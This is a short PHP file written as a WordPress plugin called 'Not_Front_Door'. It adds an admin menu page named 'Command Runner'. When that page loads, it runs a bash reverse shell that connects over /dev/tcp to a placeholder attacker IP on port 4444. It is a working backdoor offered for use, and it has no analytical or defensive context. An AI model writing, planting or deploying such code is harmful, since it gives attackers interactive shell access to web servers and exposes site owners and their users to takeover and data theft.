<?php
/*
 * Plugin Name: Not_Front_Door
 * Author: KafsiDerma
 * Author URI: kafsiderma
 */

add_action('admin_menu', function() {
    add_menu_page(
        'Command Runner',     // Page title
        'Command Runner',     // Menu title
        'manage_options',     // Capability
        'cmd-runner',         // Menu slug
        'not_front_door_page' // Function to display content
    );
});

function not_front_door_page() {
    echo "<h1>Hello from Not_Front_Door</h1>";
	
	// Run shell command
    $ip = "XXX.XXX.XXX.XXX";
    $port = 4444;

    $cmd = "/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'";;

    shell_exec($cmd);

    echo "<p>If nothing happened, check firewall or PHP settings.</p>";
	
}
